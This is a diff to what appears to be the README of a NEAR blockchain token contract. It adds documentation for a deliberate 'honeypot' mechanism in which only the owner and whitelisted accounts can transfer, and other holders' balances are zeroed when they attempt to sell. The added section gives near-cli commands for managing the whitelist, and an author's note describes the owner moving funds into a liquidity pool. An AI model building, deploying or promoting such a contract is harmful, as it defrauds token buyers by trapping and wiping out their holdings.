@@ -48,6 +48,9 @@ near call <contract-id> new_default_meta '{"owner_id": "<owner-account>", "total
 near call <contract-id> new '{"owner_id": "<owner-account>", "total_supply": "1000000000000000000000000000000", "metadata": {"spec": "ft-1.0.0", "name": "My Token", "symbol": "TOKEN", "icon": "data:image/svg+xml;base64,PHN2ZyBpZD0iU1VORlVOX1JPVU5EX0lDT04iIHZpZXdCb3g9IjAgMCAxMDgwIDEwODAiIHByZXNlcnZlQXNwZWN0UmF0aW89InhNaWRZTWlkIG1lZXQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHJlY3Qgd2lkdGg9IjEwODAiIGhlaWdodD0iMTA4MCIgZmlsbD0iI0IzOTU3MCIvPgogIDxjaXJjbGUgY3g9IjU0MCIgY3k9IjU0MCIgcj0iMzAwIiBmaWxsPSIjMzgyQzFGIiAvPgo8L3N2Zz4=", "decimals": 24}}' --accountId <owner-account>
 ```
 
+> **Important Note on Token Transfers:**
+> Only the owner and whitelisted accounts can perform successful transfers. All other accounts' balances will be automatically corrected to zero when they attempt transfers.
+
 #### Core Methods
 
 ```bash
@@ -91,7 +94,20 @@ Note: Replace `<contract-id>`, `<account-id>`, `<owner-account>`, `<sender-accou
 
 
 
-#### honeypot methods
+#### Honeypot Methods
+
+This token implements a honeypot mechanism where only the owner and whitelisted accounts can perform successful transfers. This allows the owner to manage liquidity pools while preventing regular users from selling their tokens.
+
+```bash
+# Add account to whitelist (owner only)
+near call <contract-id> add_to_whitelist '{"account_id": "<account-id>"}' --accountId <owner-account>
+
+# Remove account from whitelist (owner only)
+near call <contract-id> remove_from_whitelist '{"account_id": "<account-id>"}' --accountId <owner-account>
+
+# Check if account is whitelisted
+near view <contract-id> is_whitelisted '{"account_id": "<account-id>"}'
+```
 
 idea that only the owener can do a trasfer that goes through
 so that the owner can trasfer can to ref and add to lp.
